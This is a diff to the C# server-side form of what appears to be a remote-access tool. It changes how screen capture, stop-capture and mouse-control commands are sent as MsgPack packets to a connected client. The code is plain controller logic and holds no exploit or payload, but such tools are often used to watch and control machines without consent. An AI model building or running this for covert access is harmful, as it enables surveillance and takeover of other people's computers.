@@ -71,8 +71,8 @@ namespace Server.Forms
             {
                 button2.Top = panel1.Bottom + 5;
                 button2.Left = pictureBox1.Width / 2;
-                button1.Tag = (object)"stop";
-                button2.PerformClick();
+                button1.Tag = (object)"play";
+                //button2.PerformClick();
             }
             catch { }
         }
@@ -83,27 +83,29 @@ namespace Server.Forms
             {
                 MsgPack msgpack = new MsgPack();
                 msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
-                msgpack.ForcePathObject("Option").AsString = "capture";
+                msgpack.ForcePathObject("Command").AsString = "capture";
                 msgpack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value.ToString());
                 msgpack.ForcePathObject("Screen").AsInteger = Convert.ToInt32(numericUpDown2.Value.ToString());
                 decoder = new UnsafeStreamCodec(Convert.ToInt32(numericUpDown1.Value));
-                ThreadPool.QueueUserWorkItem(ParentClient.Send, msgpack.Encode2Bytes());
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 numericUpDown1.Enabled = false;
                 numericUpDown2.Enabled = false;
+                btnSave.Enabled = true;
+                btnMouse.Enabled = true;
                 button1.Tag = (object)"stop";
                 button1.BackgroundImage = Properties.Resources.stop__1_;
             }
             else
             {
                 button1.Tag = (object)"play";
-                try
-                {
-                    Client.Disconnected();
-                    Client = null;
-                }
-                catch { }
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
+                msgpack.ForcePathObject("Command").AsString = "stopCapture";
+                ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
                 numericUpDown1.Enabled = true;
                 numericUpDown2.Enabled = true;
+                btnSave.Enabled = false;
+                btnMouse.Enabled = false;
                 button1.BackgroundImage = Properties.Resources.play_button;
             }
         }
@@ -183,7 +185,7 @@ namespace Server.Forms
 
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
-                    msgpack.ForcePathObject("Option").AsString = "mouseClick";
+                    msgpack.ForcePathObject("Command").AsString = "mouseClick";
                     msgpack.ForcePathObject("X").AsInteger = p.X;
                     msgpack.ForcePathObject("Y").AsInteger = p.Y;
                     msgpack.ForcePathObject("Button").AsInteger = button;
@@ -208,7 +210,7 @@ namespace Server.Forms
 
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
-                    msgpack.ForcePathObject("Option").AsString = "mouseClick";
+                    msgpack.ForcePathObject("Command").AsString = "mouseClick";
                     msgpack.ForcePathObject("X").AsInteger = (Int32)(p.X);
                     msgpack.ForcePathObject("Y").AsInteger = (Int32)(p.Y);
                     msgpack.ForcePathObject("Button").AsInteger = (Int32)(button);
@@ -227,7 +229,7 @@ namespace Server.Forms
                     Point p = new Point(e.X * (rdSize.Width / pictureBox1.Width), e.Y * (rdSize.Height / pictureBox1.Height));
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "remoteDesktop";
-                    msgpack.ForcePathObject("Option").AsString = "mouseMove";
+                    msgpack.ForcePathObject("Command").AsString = "mouseMove";
                     msgpack.ForcePathObject("X").AsInteger = (Int32)(p.X);
                     msgpack.ForcePathObject("Y").AsInteger = (Int32)(p.Y);
                     ThreadPool.QueueUserWorkItem(Client.Send, msgpack.Encode2Bytes());
